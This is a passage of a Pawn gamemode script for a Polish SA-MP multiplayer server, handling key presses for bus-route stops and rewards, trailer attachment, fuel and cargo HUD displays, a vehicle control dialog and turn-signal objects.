								SetPVarInt(playerid,"playerPrzystanek",2);
								SetPlayerMapIcon(playerid,70,LiniaInfo[kID][linx],LiniaInfo[kID][liny],LiniaInfo[kID][linz],53 , 0, MAPICON_GLOBAL);

								new string[150];
								SendClientMessage(playerid, Zielony, "# Przystanek zaliczony!");
								new biletnum = random(10);
								PlayerInfo[playerid][Bilety] += biletnum;
								format(string,sizeof string,"# Otrzymales: %d biletow!",biletnum);
								SendClientMessage(playerid, Zielony, string);
								format(string,sizeof string,"# Kurs na przystanek: "BIALYHEX"%s",LiniaInfo[kID][linname]);
								SendClientMessage(playerid, Zielony, string);

							}
						}


						if(przyst == 2)
						{


							new kID = KursInfo[linid][kurs3];

							if(IsPlayerInRangeOfPoint(playerid, 8.0, LiniaInfo[kID][linx],LiniaInfo[kID][liny],LiniaInfo[kID][linz]))
							{
								kID = KursInfo[linid][kurs4];

								SetPVarInt(playerid,"playerPrzystanek",3);
								SetPlayerMapIcon(playerid,70,LiniaInfo[kID][linx],LiniaInfo[kID][liny],LiniaInfo[kID][linz],53 , 0, MAPICON_GLOBAL);

								new string[150];
								SendClientMessage(playerid, Zielony, "# Przystanek zaliczony!");
								new biletnum = random(10);
								PlayerInfo[playerid][Bilety] += biletnum;
								format(string,sizeof string,"# Otrzymales: %d biletow!",biletnum);
								SendClientMessage(playerid, Zielony, string);
								format(string,sizeof string,"# Kurs na przystanek: "BIALYHEX"%s",LiniaInfo[kID][linname]);
								SendClientMessage(playerid, Zielony, string);

							}
						}

						if(przyst == 3)
						{


							new kID = KursInfo[linid][kurs4];

							if(IsPlayerInRangeOfPoint(playerid, 8.0, LiniaInfo[kID][linx],LiniaInfo[kID][liny],LiniaInfo[kID][linz]))
							{
								kID = KursInfo[linid][kurs5];

								SetPVarInt(playerid,"playerPrzystanek",4);
								SetPlayerMapIcon(playerid,70,LiniaInfo[kID][linx],LiniaInfo[kID][liny],LiniaInfo[kID][linz],53 , 0, MAPICON_GLOBAL);

								new string[150];
								SendClientMessage(playerid, Zielony, "# Przystanek zaliczony!");
								new biletnum = random(10);
								PlayerInfo[playerid][Bilety] += biletnum;
								format(string,sizeof string,"# Otrzymales: %d biletow!",biletnum);
								SendClientMessage(playerid, Zielony, string);
								format(string,sizeof string,"# Kurs na przystanek: "BIALYHEX"%s",LiniaInfo[kID][linname]);
								SendClientMessage(playerid, Zielony, string);

							}
						}


						if(przyst == 4)
						{


							new kID = KursInfo[linid][kurs5];

							if(IsPlayerInRangeOfPoint(playerid, 8.0, LiniaInfo[kID][linx],LiniaInfo[kID][liny],LiniaInfo[kID][linz]))
							{
								kID = KursInfo[linid][kurs6];

								SetPVarInt(playerid,"playerPrzystanek",5);
								SetPlayerMapIcon(playerid,70,LiniaInfo[kID][linx],LiniaInfo[kID][liny],LiniaInfo[kID][linz],53 , 0, MAPICON_GLOBAL);

								new string[150];
								SendClientMessage(playerid, Zielony, "# Przystanek zaliczony!");
								new biletnum = random(10);
								PlayerInfo[playerid][Bilety] += biletnum;
								format(string,sizeof string,"# Otrzymales: %d biletow!",biletnum);
								SendClientMessage(playerid, Zielony, string);
								format(string,sizeof string,"# Kurs na przystanek: "BIALYHEX"%s",LiniaInfo[kID][linname]);
								SendClientMessage(playerid, Zielony, string);

							}
						}

						if(przyst == 5)
						{


							new kID = KursInfo[linid][kurs6];

							if(IsPlayerInRangeOfPoint(playerid, 8.0, LiniaInfo[kID][linx],LiniaInfo[kID][liny],LiniaInfo[kID][linz]))
							{
								kID = KursInfo[linid][kurs7];

								SetPVarInt(playerid,"playerPrzystanek",6);
								SetPlayerMapIcon(playerid,70,LiniaInfo[kID][linx],LiniaInfo[kID][liny],LiniaInfo[kID][linz],53 , 0, MAPICON_GLOBAL);

								new string[150];
								SendClientMessage(playerid, Zielony, "# Przystanek zaliczony!");
								new biletnum = random(10);
								PlayerInfo[playerid][Bilety] += biletnum;
								format(string,sizeof string,"# Otrzymales: %d biletow!",biletnum);
								SendClientMessage(playerid, Zielony, string);
								format(string,sizeof string,"# Kurs na przystanek: "BIALYHEX"%s",LiniaInfo[kID][linname]);
								SendClientMessage(playerid, Zielony, string);

							}
						}

						if(przyst == 6) // OSTATNIE
						{


							new kID = KursInfo[linid][kurs7];

							if(IsPlayerInRangeOfPoint(playerid, 8.0, LiniaInfo[kID][linx],LiniaInfo[kID][liny],LiniaInfo[kID][linz]))
							{
								//kID = KursInfo[linid][kurs3];

								SetPVarInt(playerid,"playerPrzystanek",-1);
								SetPVarInt(playerid,"playerKurs",-1);
								new string[150];
								new biletnum = random(10);
								PlayerInfo[playerid][Bilety] += biletnum;
								format(string,sizeof string,"# Otrzymales: %d biletow!",biletnum);
								SendClientMessage(playerid, Zielony, string);
								//new string[150];
								SendClientMessage(playerid, Zielony, "# Przystanek zaliczony!");
								if(PlayerInfo[playerid][VIP] == 1)
								{
									SendClientMessage(playerid, Zielony, "** Wynagrodzenie za kurs: {FFFFFF}$500 i 30 score **"); // ustawiasz se wynagrodzenie
									GiveMoneyEx(playerid,500);
									GiveScoreEx(playerid,GetScoreEx(playerid)+30);
									Earned(playerid,500,"Zaliczenie kursu, vip");
								}
								if(PlayerInfo[playerid][VIP] == 0)
								{
									SendClientMessage(playerid, Zielony, "** Wynagrodzenie za kurs: {FFFFFF}$250 i 15 score **"); // ustawiasz se wynagrodzenie
									GiveMoneyEx(playerid,250);
									GiveScoreEx(playerid,GetScoreEx(playerid)+15);
									Earned(playerid,250,"Zaliczenie kursu, bez vip");
								}
								//SendClientMessage(playerid, Zolty, "Wynagrodzenie za bilety: "BIALYHEX"$480");
								//Earned(playerid,200);

								format(string,sizeof string,"# Wynagrodzenie za bilety: $%d",PlayerInfo[playerid][Bilety]*BILET_MONEY);
								SendClientMessage(playerid, Zielony, string);

								GiveMoneyEx(playerid,PlayerInfo[playerid][Bilety]*BILET_MONEY);
								Earned(playerid,PlayerInfo[playerid][Bilety]*BILET_MONEY,"Bonus bilety");

								if(BonusCargo == true)
								{
								SendClientMessage(playerid,Zielony,"# HappyWorld bonus: "BIALYHEX"$"HW_MONEY_TEXT" "ZIELONYHEX"i"BIALYHEX" "HW_SCORE_TEXT" score");
								GiveMoneyEx(playerid,HW_MONEY);
								GiveScoreEx(playerid,GetScoreEx(playerid)+HW_SCORE);
								Earned(playerid,HW_MONEY,"Bonus HW kurs");
								}

								RemovePlayerMapIcon(playerid, 69);
								PlayerInfo[playerid][Bilety] = 0;

							}
						}

					}
					else
					{
						SendClientMessage(playerid,Szary,"# Aby zaliczyc przystanek musisz zwolnic do 15 km/h!");
					}
				}


			}

		}

		if(newkeys & 4) // KEY >> LEWY ALT
		{
			if(GetVehicleModel(vehid) == 411 || GetVehicleModel(vehid) == 525 || GetVehicleModel(vehid) == 552 || GetPlayerState(playerid) != 2)
			{
			new vehicleid = GetPlayerVehicleID(playerid);

			if(IsTrailerAttachedToVehicle(vehicleid))
			{
				DetachTrailerFromVehicle(vehicleid);
			}
			else
			{
				new Float:pPos[4], Float:vPos[4];

				GetVehiclePos(vehicleid, pPos[0], pPos[1], pPos[2]);
				GetVehicleZAngle(vehicleid, pPos[3]);

				for(new vehicle = 1; vehicle < MAX_VEHICLES; vehicle++)
				{
					GetVehiclePos(vehicle, vPos[0], vPos[1], vPos[2]);
					GetVehicleZAngle(vehicle, vPos[3]);

					if(floatabs(pPos[0] - vPos[0]) < 7.0 && floatabs(pPos[1] - vPos[1]) < 7.0 && floatabs(pPos[2] - vPos[2]) < 7.0 && vehicleid != vehicle)
					{
						AttachTrailerToVehicle(vehicle, vehicleid);
					}
				}
			}
			}
		}


		if(newkeys & 65536)//65536) // KEY: Y
		{
			if(vehid != 0 && GetPlayerState(playerid) == 2 && VehicleInfo[vehid][Paliwo] > 0)
			{


				vehid = GetPlayerVehicleID(playerid);
				new engine, lights, alarm, doors, bonnet, boot, objective;
				if(vehid != 0 && GetPlayerState(playerid) == 2 && VehicleInfo[vehid][Paliwo] > 0)
					if(GetVehicleParamsEx(vehid, engine, lights, alarm, doors, bonnet, boot, objective))
				{

					new modelt = GetVehicleTrailer(vehid);
					new dllt = GetVehicleIDTrailer(playerid,vehid,modelt);


					if(vehid != 0 && VehicleInfo[dllt][Towar] >= 1 && IsTrailerAttachedToVehicle(vehid))
					{


						if(GetVehicleParamsEx(vehid, engine, lights, alarm, doors, bonnet, boot, objective))
						{


							if(engine == 1 && VehicleInfo[dllt][Towar] >= 1 && paused[playerid] == false)
							{

								new Float:predx, Float:predy, Float:predz,predb;
								GetVehicleVelocity(vehid,predx,predy,predz);
								predb = floatround(floatsqroot(floatpower(predx, 2) + floatpower(predy, 2) + floatpower(predz, 2)) * 169);

								if(predb >= 1 && predb <= 10)
								{
									VehicleInfo[dllt][KM] += 0.0001;
								}
								if(predb >= 11 && predb <= 20)
								{
									VehicleInfo[dllt][KM] += 0.0008;
								}
								if(predb >= 21 && predb <= 30)
								{
									VehicleInfo[dllt][KM] += 0.0015;
								}
								if(predb >= 31 && predb <= 40)
								{
									VehicleInfo[dllt][KM] += 0.0020;
								}
								if(predb >= 41 && predb <= 50)
								{
									VehicleInfo[dllt][KM] += 0.0026;
								}
								if(predb >= 51 && predb <= 60)
								{
									VehicleInfo[dllt][KM] += 0.0030;
								}
								if(predb >= 61 && predb <= 70)
								{
									VehicleInfo[dllt][KM] += 0.0034;
								}
								if(predb >= 71 && predb <= 80)
								{
									VehicleInfo[dllt][KM] += 0.0039;
								}
								if(predb >= 81 && predb <= 90)
								{
									VehicleInfo[dllt][KM] += 0.0043;
								}
								if(predb >= 91 && predb <= 100)
								{
									VehicleInfo[dllt][KM] += 0.0048;
								}
								if(predb >= 101 && predb <= 110)
								{
									VehicleInfo[dllt][KM] += 0.0064;
								}
								if(predb >= 111 && predb <= 120)
								{
									VehicleInfo[dllt][KM] += 0.0078;
								}
								if(predb >= 121 && predb <= 130)
								{
									VehicleInfo[dllt][KM] += 0.0087;
								}
								if(predb >= 131 && predb <= 140)
								{
									VehicleInfo[dllt][KM] += 0.0094;
								}
								if(predb >= 141 && predb <= 150)
								{
									VehicleInfo[dllt][KM] += 0.0100;
								}
								if(predb >= 151 && predb <= 160)
								{
									VehicleInfo[dllt][KM] += 0.0109;
								}
								if(predb >= 161)
								{
									VehicleInfo[dllt][KM] += 0.0115;
								}

								new query[150];
								new towar = VehicleInfo[dllt][Towar];
								format(query,sizeof query,"~r~%s - %0.2f km",cInfo[towar][namet],VehicleInfo[dllt][KM]);
								TextDrawSetString(towartd[playerid],query);
								TextDrawShowForPlayer(playerid,towartd[playerid]);

							}
							else
							{




							}
						}
					}
					else
					{
						TextDrawHideForPlayer(playerid,towartd[playerid]);

					}



					if(engine == 1)
					{
						//SetVehicleParamsEx(vehid,0,0,0,0,0,0,0);

					}
					else
					{
						new query[150];

						new paliwstatus[50];

						if(VehicleInfo[vehid][Paliwo] >= 300)
						{
							format(paliwstatus,sizeof paliwstatus,"~w~%d L",VehicleInfo[vehid][Paliwo]);
						}

						if(VehicleInfo[vehid][Paliwo] >= 250 && VehicleInfo[vehid][Paliwo] <= 299)
						{
							format(paliwstatus,sizeof paliwstatus,"~w~%d L",VehicleInfo[vehid][Paliwo]);
						}

						if(VehicleInfo[vehid][Paliwo] >= 200 && VehicleInfo[vehid][Paliwo] <= 249)
						{
							format(paliwstatus,sizeof paliwstatus,"~w~%d L",VehicleInfo[vehid][Paliwo]);
						}

						if(VehicleInfo[vehid][Paliwo] >= 150 && VehicleInfo[vehid][Paliwo] <= 199)
						{
							format(paliwstatus,sizeof paliwstatus,"~w~%d L",VehicleInfo[vehid][Paliwo]);
						}

						if(VehicleInfo[vehid][Paliwo] >= 100 && VehicleInfo[vehid][Paliwo] <= 149)
						{
							format(paliwstatus,sizeof paliwstatus,"~w~%d L",VehicleInfo[vehid][Paliwo]);
						}

						if(VehicleInfo[vehid][Paliwo] >= 1 && VehicleInfo[vehid][Paliwo] <= 99)
						{
							format(paliwstatus,sizeof paliwstatus,"~r~%d ~y~[R]",VehicleInfo[vehid][Paliwo]);
						}

						if(VehicleInfo[vehid][Paliwo] <= 0)
						{
							GameTextForPlayer(playerid, "Koniec paliwa!",8000,5);
							SetVehicleParamsEx(vehid, 0,0,0,0,0,0,0);
						}
						format(query,sizeof query,"~r~Paliwo: %s",paliwstatus);
						TextDrawSetString(paliwotd[playerid],query);

						//SetVehicleParamsEx(vehid, 1,1,0,0,0,0,0);
					}
				}
		//SetVehicleParamsEx(vehid,0,0,0,0,0,0,0);
				
				//printf("test");
				vehid = GetPlayerVehicleID(playerid);
				//new engine, lights, alarm, doors, bonnet, boot, objective;

				if(GetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, doors, bonnet, boot, objective))
				{
					//printf("%d",engine);
					//printf("%d",lights);

					GetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, doors, bonnet, boot, objective);
					//printf("tes2");
					//printf("%d",engine);
					//printf("%d",lights);
					new stringp[150];
					//strcat(stringp,"test");
					//new test[10];
					///format(test,sizeof test,"test2");
					//strcat(stringp,test);
					if(engine == 1) strcat(stringp, ""CZERWONYHEX"Wylacz silnik 			[ON]\n");
					else 			strcat(stringp, ""BIALYHEX"Wlacz Silnik 			[OFF]\n");

					if(lights == 1) strcat(stringp, ""CZERWONYHEX"Wylacz Lampy 			[ON]\n");
					else 			strcat(stringp, ""BIALYHEX"Wlacz Lampy 			[OFF]\n");

					//if(doors == 1)  strcat(stringp, ""BIALYHEX"Odblokuj drzwi 			[CLOSED]");
					//else 			strcat(stringp, ""CZERWONYHEX"Zablokuj drzwi 			[OPENED]");



					if(engine == 1)
					{
						TextDrawSetString(silniktd[playerid],"~r~Silnik: ~w~ON");
					}
					else
					{
						TextDrawSetString(silniktd[playerid],"~r~Silnik: ~w~OFF");
					}

					//printf(stringp);



					ShowPlayerDialog(playerid, DIALOG_POJAZD, DIALOG_STYLE_LIST, ">> Panel Pojazdu <<", stringp, "Wybierz", "Anuluj");
					

					/*
					new modelt = GetVehicleTrailer(vehid);
					new dllt = GetVehicleIDTrailer(playerid,vehid,modelt);

					if(vehid != 0 && VehicleInfo[dllt][Towar] >= 1 && IsTrailerAttachedToVehicle(vehid))
					{


						if(GetVehicleParamsEx(vehid, engine, lights, alarm, doors, bonnet, boot, objective))
						{


							if(engine == 1 && VehicleInfo[dllt][Towar] >= 1 && paused[playerid] == false)
							{

								new Float:predx, Float:predy, Float:predz,predb;
								GetVehicleVelocity(vehid,predx,predy,predz);
								predb = floatround(floatsqroot(floatpower(predx, 2) + floatpower(predy, 2) + floatpower(predz, 2)) * 169);

								if(predb >= 1 && predb <= 10)
								{
									VehicleInfo[dllt][KM] += 0.0001;
								}
								if(predb >= 11 && predb <= 20)
								{
									VehicleInfo[dllt][KM] += 0.0008;
								}
								if(predb >= 21 && predb <= 30)
								{
									VehicleInfo[dllt][KM] += 0.0015;
								}
								if(predb >= 31 && predb <= 40)
								{
									VehicleInfo[dllt][KM] += 0.0020;
								}
								if(predb >= 41 && predb <= 50)
								{
									VehicleInfo[dllt][KM] += 0.0026;
								}
								if(predb >= 51 && predb <= 60)
								{
									VehicleInfo[dllt][KM] += 0.0030;
								}
								if(predb >= 61 && predb <= 70)
								{
									VehicleInfo[dllt][KM] += 0.0034;
								}
								if(predb >= 71 && predb <= 80)
								{
									VehicleInfo[dllt][KM] += 0.0039;
								}
								if(predb >= 81 && predb <= 90)
								{
									VehicleInfo[dllt][KM] += 0.0043;
								}
								if(predb >= 91 && predb <= 100)
								{
									VehicleInfo[dllt][KM] += 0.0048;
								}
								if(predb >= 101 && predb <= 110)
								{
									VehicleInfo[dllt][KM] += 0.0064;
								}
								if(predb >= 111 && predb <= 120)
								{
									VehicleInfo[dllt][KM] += 0.0078;
								}
								if(predb >= 121 && predb <= 130)
								{
									VehicleInfo[dllt][KM] += 0.0087;
								}
								if(predb >= 131 && predb <= 140)
								{
									VehicleInfo[dllt][KM] += 0.0094;
								}
								if(predb >= 141 && predb <= 150)
								{
									VehicleInfo[dllt][KM] += 0.0100;
								}
								if(predb >= 151 && predb <= 160)
								{
									VehicleInfo[dllt][KM] += 0.0109;
								}
								if(predb >= 161)
								{
									VehicleInfo[dllt][KM] += 0.0115;
								}

								new query[150];
								new towar = VehicleInfo[dllt][Towar];
								format(query,sizeof query,"~r~%s - %0.2f km",cInfo[towar][namet],VehicleInfo[dllt][KM]);
								TextDrawSetString(towartd[playerid],query);
								TextDrawShowForPlayer(playerid,towartd[playerid]);

							}
							else
							{




							}
						}
					}
					else
					{
						TextDrawHideForPlayer(playerid,towartd[playerid]);

					}



					if(engine == 1)
					{
						SetVehicleParamsEx(vehid,0,0,0,0,0,0,0);

					}
					else
					{
						new query[150];

						new paliwstatus[50];

						if(VehicleInfo[vehid][Paliwo] >= 300)
						{
							format(paliwstatus,sizeof paliwstatus,"~w~%d L",VehicleInfo[vehid][Paliwo]);
						}

						if(VehicleInfo[vehid][Paliwo] >= 250 && VehicleInfo[vehid][Paliwo] <= 299)
						{
							format(paliwstatus,sizeof paliwstatus,"~w~%d L",VehicleInfo[vehid][Paliwo]);
						}

						if(VehicleInfo[vehid][Paliwo] >= 200 && VehicleInfo[vehid][Paliwo] <= 249)
						{
							format(paliwstatus,sizeof paliwstatus,"~w~%d L",VehicleInfo[vehid][Paliwo]);
						}

						if(VehicleInfo[vehid][Paliwo] >= 150 && VehicleInfo[vehid][Paliwo] <= 199)
						{
							format(paliwstatus,sizeof paliwstatus,"~w~%d L",VehicleInfo[vehid][Paliwo]);
						}

						if(VehicleInfo[vehid][Paliwo] >= 100 && VehicleInfo[vehid][Paliwo] <= 149)
						{
							format(paliwstatus,sizeof paliwstatus,"~w~%d L",VehicleInfo[vehid][Paliwo]);
						}

						if(VehicleInfo[vehid][Paliwo] >= 1 && VehicleInfo[vehid][Paliwo] <= 99)
						{
							format(paliwstatus,sizeof paliwstatus,"~r~%d ~y~[R]",VehicleInfo[vehid][Paliwo]);
						}

						if(VehicleInfo[vehid][Paliwo] <= 0)
						{
							GameTextForPlayer(playerid, "Koniec paliwa!",8000,5);
							SetVehicleParamsEx(vehid, 0,0,0,0,0,0,0);
						}
						format(query,sizeof query,"~r~Paliwo: %s",paliwstatus);
						TextDrawSetString(paliwotd[playerid],query);

						SetVehicleParamsEx(vehid, 1,1,0,0,0,0,0);
					}

					if(engine == 1)
					{
						TextDrawSetString(silniktd[playerid],"~r~Silnik: ~w~OFF");
					}
					else
					{
						TextDrawSetString(silniktd[playerid],"~r~Silnik: ~w~ON");
					}

				*/
				}
			






			}

		}


		/*if(newkeys & 4096)
		{
			if(vehid != 0 && GetPlayerState(playerid) == 2 && VehicleInfo[vehid][Paliwo] > 0)
			{
				new engine, lights, alarm, doors, bonnet, boot, objective;

				if(GetVehicleParamsEx(vehid, engine, lights, alarm, doors, bonnet, boot, objective))
				{

					new modelt = GetVehicleTrailer(vehid);
					new dllt = GetVehicleIDTrailer(playerid,vehid,modelt);

					if(vehid != 0 && VehicleInfo[dllt][Towar] >= 1 && IsTrailerAttachedToVehicle(vehid))
					{


						if(GetVehicleParamsEx(vehid, engine, lights, alarm, doors, bonnet, boot, objective))
						{


							if(engine == 1 && VehicleInfo[dllt][Towar] >= 1 && paused[playerid] == false)
							{

								new Float:predx, Float:predy, Float:predz,predb;
								GetVehicleVelocity(vehid,predx,predy,predz);
								predb = floatround(floatsqroot(floatpower(predx, 2) + floatpower(predy, 2) + floatpower(predz, 2)) * 169);

								if(predb >= 1 && predb <= 10)
								{
									VehicleInfo[dllt][KM] += 0.0001;
								}
								if(predb >= 11 && predb <= 20)
								{
									VehicleInfo[dllt][KM] += 0.0008;
								}
								if(predb >= 21 && predb <= 30)
								{
									VehicleInfo[dllt][KM] += 0.0015;
								}
								if(predb >= 31 && predb <= 40)
								{
									VehicleInfo[dllt][KM] += 0.0020;
								}
								if(predb >= 41 && predb <= 50)
								{
									VehicleInfo[dllt][KM] += 0.0026;
								}
								if(predb >= 51 && predb <= 60)
								{
									VehicleInfo[dllt][KM] += 0.0030;
								}
								if(predb >= 61 && predb <= 70)
								{
									VehicleInfo[dllt][KM] += 0.0034;
								}
								if(predb >= 71 && predb <= 80)
								{
									VehicleInfo[dllt][KM] += 0.0039;
								}
								if(predb >= 81 && predb <= 90)
								{
									VehicleInfo[dllt][KM] += 0.0043;
								}
								if(predb >= 91 && predb <= 100)
								{
									VehicleInfo[dllt][KM] += 0.0048;
								}
								if(predb >= 101 && predb <= 110)
								{
									VehicleInfo[dllt][KM] += 0.0064;
								}
								if(predb >= 111 && predb <= 120)
								{
									VehicleInfo[dllt][KM] += 0.0078;
								}
								if(predb >= 121 && predb <= 130)
								{
									VehicleInfo[dllt][KM] += 0.0087;
								}
								if(predb >= 131 && predb <= 140)
								{
									VehicleInfo[dllt][KM] += 0.0094;
								}
								if(predb >= 141 && predb <= 150)
								{
									VehicleInfo[dllt][KM] += 0.0100;
								}
								if(predb >= 151 && predb <= 160)
								{
									VehicleInfo[dllt][KM] += 0.0109;
								}
								if(predb >= 161)
								{
									VehicleInfo[dllt][KM] += 0.0115;
								}

								new query[150];
								new towar = VehicleInfo[dllt][Towar];
								format(query,sizeof query,"~r~%s - %0.2f km",cInfo[towar][namet],VehicleInfo[dllt][KM]);
								TextDrawSetString(towartd[playerid],query);
								TextDrawShowForPlayer(playerid,towartd[playerid]);

							}
							else
							{




							}
						}
					}
					else
					{
						TextDrawHideForPlayer(playerid,towartd[playerid]);

					}



					if(engine == 1)
					{
						SetVehicleParamsEx(vehid,0,0,0,0,0,0,0);

					}
					else
					{
						new query[150];

						new paliwstatus[50];

						if(VehicleInfo[vehid][Paliwo] >= 300)
						{
							format(paliwstatus,sizeof paliwstatus,"~w~%d L",VehicleInfo[vehid][Paliwo]);
						}

						if(VehicleInfo[vehid][Paliwo] >= 250 && VehicleInfo[vehid][Paliwo] <= 299)
						{
							format(paliwstatus,sizeof paliwstatus,"~w~%d L",VehicleInfo[vehid][Paliwo]);
						}

						if(VehicleInfo[vehid][Paliwo] >= 200 && VehicleInfo[vehid][Paliwo] <= 249)
						{
							format(paliwstatus,sizeof paliwstatus,"~w~%d L",VehicleInfo[vehid][Paliwo]);
						}

						if(VehicleInfo[vehid][Paliwo] >= 150 && VehicleInfo[vehid][Paliwo] <= 199)
						{
							format(paliwstatus,sizeof paliwstatus,"~w~%d L",VehicleInfo[vehid][Paliwo]);
						}

						if(VehicleInfo[vehid][Paliwo] >= 100 && VehicleInfo[vehid][Paliwo] <= 149)
						{
							format(paliwstatus,sizeof paliwstatus,"~w~%d L",VehicleInfo[vehid][Paliwo]);
						}

						if(VehicleInfo[vehid][Paliwo] >= 1 && VehicleInfo[vehid][Paliwo] <= 99)
						{
							format(paliwstatus,sizeof paliwstatus,"~r~%d ~y~[R]",VehicleInfo[vehid][Paliwo]);
						}

						if(VehicleInfo[vehid][Paliwo] <= 0)
						{
							GameTextForPlayer(playerid, "Koniec paliwa!",8000,5);
							SetVehicleParamsEx(vehid, 0,0,0,0,0,0,0);
						}
						format(query,sizeof query,"~r~Paliwo: %s",paliwstatus);
						TextDrawSetString(paliwotd[playerid],query);

						SetVehicleParamsEx(vehid, 1,1,0,0,0,0,0);
					}

					if(engine == 1)
					{
						TextDrawSetString(silniktd[playerid],"~r~Silnik: ~w~OFF");
					}
					else
					{
						TextDrawSetString(silniktd[playerid],"~r~Silnik: ~w~ON");
					}


				}







			}

		}
*/



		new vehicleid = GetPlayerVehicleID(playerid);
		new kid = GetVehicleModel(vehicleid);

		if(newkeys & KEY_LOOK_LEFT)
		{
			if(GetPVarInt(playerid, "lewy") == 0)
			{
				if(kid == 515)
				{
					if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
					{
						LewyMigacz1[vehicleid] = CreateObject(19294,0,0,-1000,0,0,0,100);
						AttachObjectToVehicle(LewyMigacz1[vehicleid], vehicleid, -1.3, 4.3, -0.33, -1.3, -2.499999, -0.2);
						LewyMigacz2[vehicleid] = CreateObject(19294,0,0,-1000,0,0,0,100);
						AttachObjectToVehicle(LewyMigacz2[vehicleid], vehicleid, -1.3, -5.0, -1.15, -1.3, -2.499999, -0.2);
						DestroyObject(PrawyMigacz1[vehicleid]);
						DestroyObject(PrawyMigacz2[vehicleid]);
						SetPVarInt(playerid, "lewy", 1);

						if(GetVehicleTrailer(vehicleid))
						{
							// LEWY
							NaczepaMigacz1[vehicleid] = CreateObject(19294,0,0,-1000,0,0,0,100);
							AttachObjectToVehicle(NaczepaMigacz1[vehicleid], GetVehicleIDTrailer(playerid,vehicleid,GetVehicleTrailer(vehicleid)), -1.049999,-4.125001,-0.750000,0.000000,0.000000,0.000000);

						}
					}
				}
				if(kid == 514)
				{
					if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
					{
						LewyMigacz1[vehicleid] = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 250.0);
						AttachObjectToVehicle(LewyMigacz1[vehicleid], vehicleid, -1.24, 4.3, 0.1, -1.3, -2.499999, -0.2);
						LewyMigacz2[vehicleid] = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 250.0);
						AttachObjectToVehicle(LewyMigacz2[vehicleid], vehicleid, -0.38, -4.99, -0.52, -1.3, -2.499999, -0.2);
						DestroyObject(PrawyMigacz1[vehicleid]);
						DestroyObject(PrawyMigacz2[vehicleid]);
						SetPVarInt(playerid, "lewy", 1);

						if(GetVehicleTrailer(vehicleid))
						{
							// LEWY
							NaczepaMigacz1[vehicleid] = CreateObject(19294,0,0,-1000,0,0,0,100);
							AttachObjectToVehicle(NaczepaMigacz1[vehicleid], GetVehicleIDTrailer(playerid,vehicleid,GetVehicleTrailer(vehicleid)), -1.049999,-4.125001,-0.750000,0.000000,0.000000,0.000000);

						}
					}
				}
			}
			else
			{
				if(kid == 515)
				{
					if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
					{
						SetPVarInt(playerid, "lewy", 0);
						DestroyObject(LewyMigacz1[vehicleid]);
						DestroyObject(LewyMigacz2[vehicleid]);
						DestroyObject(PrawyMigacz1[vehicleid]);
						DestroyObject(PrawyMigacz2[vehicleid]);
						DestroyObject(NaczepaMigacz1[vehicleid]);
						DestroyObject(NaczepaMigacz2[vehicleid]);
					}
				}
				if(kid == 514)
				{
					if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
					{
						SetPVarInt(playerid, "lewy", 0);
						DestroyObject(LewyMigacz1[vehicleid]);
						DestroyObject(LewyMigacz2[vehicleid]);
						DestroyObject(PrawyMigacz1[vehicleid]);
						DestroyObject(PrawyMigacz2[vehicleid]);
						DestroyObject(NaczepaMigacz1[vehicleid]);
						DestroyObject(NaczepaMigacz2[vehicleid]);
					}
				}
			}
		}
		if(newkeys & KEY_LOOK_RIGHT)
		{
			if(GetPVarInt(playerid, "prawy") == 0)
			{
				if(kid == 515)
				{
					if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
					{
						PrawyMigacz1[vehicleid] = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 250.0);
						AttachObjectToVehicle(PrawyMigacz1[vehicleid], vehicleid, 1.3, 4.3, -0.33, 1.3, -2.499999, -0.2);
						PrawyMigacz2[vehicleid] = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 250.0);
						AttachObjectToVehicle(PrawyMigacz2[vehicleid], vehicleid, 1.3, -5.0, -1.15, 1.3, -2.499999, -0.2);
						DestroyObject(LewyMigacz1[vehicleid]);
						DestroyObject(LewyMigacz2[vehicleid]);
						DestroyObject(NaczepaMigacz1[vehicleid]);

						SetPVarInt(playerid, "prawy", 1);

						if(GetVehicleTrailer(vehicleid))
						{
							// PRAWY
							NaczepaMigacz2[vehicleid] = CreateObject(19294,0,0,-1000,0,0,0,100);
							AttachObjectToVehicle(NaczepaMigacz2[vehicleid], GetVehicleIDTrailer(playerid,vehicleid,GetVehicleTrailer(vehicleid)), 1.049999,-4.125001,-0.750000,0.000000,0.000000,0.000000);

						}
					}
				}
				if(kid == 514)
				{
					if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
					{
						PrawyMigacz1[vehicleid] = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 250.0);
						AttachObjectToVehicle(PrawyMigacz1[vehicleid], vehicleid, 1.24, 4.3, 0.1, 1.3, -2.499999, -0.2);
						PrawyMigacz2[vehicleid] = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 250.0);
						AttachObjectToVehicle(PrawyMigacz2[vehicleid], vehicleid, 0.38, -4.99, -0.52, 1.3, -2.499999, -0.2);
						DestroyObject(LewyMigacz1[vehicleid]);
						DestroyObject(LewyMigacz2[vehicleid]);
						DestroyObject(NaczepaMigacz1[vehicleid]);

						SetPVarInt(playerid, "prawy", 1);

						if(GetVehicleTrailer(vehicleid))
						{

							// PRAWY
							NaczepaMigacz2[vehicleid] = CreateObject(19294,0,0,-1000,0,0,0,100);
							AttachObjectToVehicle(NaczepaMigacz2[vehicleid], GetVehicleIDTrailer(playerid,vehicleid,GetVehicleTrailer(vehicleid)), 1.049999,-4.125001,-0.750000,0.000000,0.000000,0.000000);

						}
					}
				}
			}
			else
			{
				if(kid == 515)
				{
					if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
					{
						SetPVarInt(playerid, "prawy", 0);
						DestroyObject(PrawyMigacz1[vehicleid]);
						DestroyObject(PrawyMigacz2[vehicleid]);
						DestroyObject(LewyMigacz1[vehicleid]);
						DestroyObject(LewyMigacz2[vehicleid]);
						DestroyObject(NaczepaMigacz1[vehicleid]);
						DestroyObject(NaczepaMigacz2[vehicleid]);
					}
